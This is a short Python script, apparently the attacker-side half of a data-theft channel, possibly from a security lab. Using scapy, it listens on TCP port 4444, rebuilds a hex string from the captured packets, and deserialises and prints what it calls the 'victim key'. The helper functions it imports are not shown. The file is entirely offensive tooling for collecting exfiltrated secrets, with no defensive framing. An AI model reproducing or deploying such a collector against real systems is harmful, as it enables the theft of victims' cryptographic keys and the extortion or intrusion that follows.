#!/usr/bin/env python3
from scapy import interfaces
from scapy.all import *
from common import *


if __name__ == "__main__":
    packets = sniff(filter="tcp port 4444", timeout=70, iface="eth0")
    reconstructed_hex_string = reconstruct_hex_string(packets)
    reconstructed_victim_key = deser_data(reconstructed_hex_string)
    print(reconstructed_victim_key)
